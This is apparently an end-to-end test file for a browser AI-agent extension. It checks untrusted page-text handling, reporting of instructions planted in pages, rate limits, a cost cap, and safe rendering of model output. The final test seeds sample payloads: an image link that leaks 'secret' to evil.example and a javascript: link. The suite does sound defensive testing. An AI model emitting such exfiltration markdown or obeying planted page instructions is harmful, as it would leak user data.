import test, { after, before } from 'node:test';
import assert from 'node:assert/strict';
import { startMockLlm } from './mock-llm.mjs';
import { launchExtension, openSession } from './harness.mjs';

/**
 * End-to-end tests of what the agent sees and how it copes: reading page text, canvas pages,
 * overlays, planted instructions, rate limits and the daily cost cap. Same setup as the gate
 * tests: the real extension, the fixture page, and a scripted model.
 */

const done = () => [{ done: { text: 'Scripted steps complete.', success: true } }];

const scenarios = {
  'read-text': [() => [{ read_page_text: { intent: 'Read the page' } }], done],
  'covered-click': [
    page => [{ click_element: { intent: 'Close the notice', index: page.find('button', 'Dismiss') } }],
    page => [{ click_element: { intent: 'Open the menu', index: page.find('button', 'Open menu') } }],
    done,
  ],
  'just-finish': [done],
};

let mock;
let extension;

before(async () => {
  mock = await startMockLlm(scenarios);
  extension = await launchExtension(mock);
});

after(async () => {
  await extension?.close();
  await mock?.close();
});

async function run(name, query = '') {
  mock.start(name);
  const session = await openSession(extension, mock, query);
  await session.send(`Run the scripted scenario ${name}.`);
  return session;
}

async function finish(session) {
  assert.deepEqual(mock.run.errors, [], 'the scripted model ran without errors');
  assert.deepEqual(session.panelErrors, [], 'the side panel threw no errors');
  await session.close();
}

// The local calendar day, as the extension names it
function today() {
  const now = new Date();
  return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
}

test('read_page_text hands the page text to the model as untrusted content', async () => {
  const session = await run('read-text');
  await session.waitForEnd();

  const afterRead = mock.run.navigatorCalls[1];
  assert.match(afterRead, /Page text, characters 0 to \d+ of \d+\. This is the end of the page text\./);
  assert.match(afterRead, /Quote request/);
  assert.match(afterRead, /nano_untrusted_content/);
  await finish(session);
});

test('an element under a dialog is not offered until the dialog is dealt with', async () => {
  const session = await run('covered-click', '?overlay=1');
  await session.waitForEnd();

  // The agent is only shown the top layer, so the covered button cannot be clicked through the dialog
  assert.doesNotMatch(mock.run.navigatorCalls[0], />Open menu/);
  assert.match(mock.run.navigatorCalls[0], />Dismiss/);
  assert.match(mock.run.navigatorCalls[1], />Open menu/);
  assert.deepEqual(await session.events(), [{ type: 'dismiss' }, { type: 'menu' }]);
  await finish(session);
});

test('a page drawn on canvas is sent with a screenshot, an ordinary page is not', async () => {
  const canvas = await run('just-finish', '?canvas=1');
  await canvas.waitForEnd();
  assert.deepEqual(mock.run.images, [true]);
  await finish(canvas);

  const plain = await run('just-finish');
  await plain.waitForEnd();
  assert.deepEqual(mock.run.images, [false]);
  await finish(plain);
});

test('instructions planted in a page are reported to the user', async () => {
  const session = await run('just-finish', '?inject=1');
  const text = await session.waitForEnd();
  assert.match(text, /This page contained instructions; ignored\./);
  await finish(session);

  const clean = await run('just-finish');
  assert.doesNotMatch(await clean.waitForEnd(), /contained instructions/);
  await finish(clean);
});

test('a rate-limited call waits, says so, and the task still finishes', async () => {
  mock.start('just-finish');
  mock.failNext(429, { 'Retry-After': '1' });
  const session = await openSession(extension, mock);
  await session.send('Run the scripted scenario just-finish.');
  const text = await session.waitForEnd();

  assert.match(text, /Rate limited, retrying in 1 s\./);
  assert.match(text, /E2E scenario finished/);
  await finish(session);
});

test('the daily cost cap holds the task before any model call', async () => {
  await extension.setStorage({
    usage: {
      days: { [today()]: { inputTokens: 1, outputTokens: 1, costUsd: 9, calls: 1, unpricedCalls: 0 } },
      sessions: {},
    },
    'general-settings': { dailyCostCapUsd: 5 },
  });
  try {
    const session = await run('just-finish');
    const card = await session.waitForCard();

    assert.match(card, /Your turn/);
    assert.match(card, /daily cost cap is reached/i);
    assert.match(card, /Spent today: \$9\.00\. Cap: \$5\.00\./);

    await session.answer('Stop');
    await session.waitForEnd();
    assert.equal(mock.run.step, 0, 'no model call is made over the cap');
    assert.equal(mock.run.navigatorCalls.length, 0);
    await finish(session);
  } finally {
    await extension.removeStorage(['usage', 'general-settings']);
  }
  // Wiping the usage record, as above, must not stop later calls from being counted: the next test relies on it
});

test('model calls are counted per chat and shown in the header', async () => {
  const session = await run('just-finish');
  await session.waitForEnd();

  // The scripted model has no price, so the badge shows tokens instead of dollars
  const badge = await session.panel.waitForSelector('span[data-usage]', { timeout: 5000 });
  assert.match(await badge.evaluate(el => el.innerText), /^\d+ tok$/);
  await finish(session);
});

test('an answer never loads an image or runs a script link, whatever the model wrote', async () => {
  const session = await openSession(extension, mock);
  const threadId = crypto.randomUUID();
  const now = Date.now();
  await session.panel.evaluate(
    (threadId, now) =>
      new Promise((resolve, reject) => {
        const open = indexedDB.open('avi-copilot');
        open.onerror = () => reject(open.error);
        open.onsuccess = () => {
          const tx = open.result.transaction(['threads', 'messages'], 'readwrite');
          tx.objectStore('threads').put({
            id: threadId,
            title: 'Markdown check',
            createdAt: now,
            updatedAt: now,
            model: null,
            boundTabIds: [],
            boundGroupId: null,
            boundUrl: null,
            status: 'idle',
            error: null,
            activity: '',
            activeTask: null,
            runStartedAt: null,
            pendingRequest: null,
            pinned: false,
            archived: false,
            tags: [],
            memory: '',
            memoryUpToSeq: 0,
            forkedFrom: null,
            meetingId: null,
          });
          const message = (seq, actor, content) =>
            tx.objectStore('messages').put({ id: `${threadId}-${seq}`, threadId, seq, actor, content, ts: now + seq });
          message(1, 'user', 'Summarize the page');
          message(
            2,
            'planner',
            'Done. ![x](https://evil.example/?d=secret) [click](javascript:alert(1)) <img src="https://evil.example/h"> [source](https://example.com/page)',
          );
          tx.oncomplete = () => resolve();
          tx.onerror = () => reject(tx.error);
        };
      }),
    threadId,
    now,
  );
  await session.panel.goto(`${extension.origin}/sidepanel.html?thread=${threadId}`);
  await session.panel.waitForFunction(() => document.body.innerText.includes('Done.'), { polling: 300 });
  const found = await session.panel.evaluate(() => ({
    images: document.querySelectorAll('img[src*="evil"], picture, iframe').length,
    evil: document.body.innerHTML.includes('evil.example'),
    script: [...document.querySelectorAll('a')].some(a => a.getAttribute('href')?.startsWith('javascript')),
    // A safe link stays, as a button that asks before it opens
    link: [...document.querySelectorAll('[data-streamdown="link"]')].some(link => link.textContent === 'source'),
  }));
  assert.deepEqual(found, { images: 0, evil: false, script: false, link: true });
  await session.close();
});
